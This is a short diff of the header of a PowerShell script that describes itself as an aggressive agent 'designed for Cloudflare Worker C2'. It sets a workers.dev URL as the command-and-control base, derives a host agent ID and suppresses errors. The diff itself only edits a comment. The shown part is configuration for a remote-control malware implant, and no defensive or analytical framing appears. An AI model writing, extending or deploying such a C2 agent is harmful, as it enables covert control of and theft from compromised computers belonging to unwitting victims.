@@ -1,7 +1,7 @@
 # AGENT v2.0 - Aggressive & Reliable
 # Designed for Cloudflare Worker C2
 
-$WORKER_BASE = "https://kalcium808.workers.dev" # REPLACE THIS
+$WORKER_BASE = "https://kalcium808.workers.dev" # REPLACE 
 $AGENT_ID = "HOST-" + (Get-ComputerName)
 $NextOffset = 0
 $ErrorActionPreference = "SilentlyContinue" # Prevents script from stopping on error
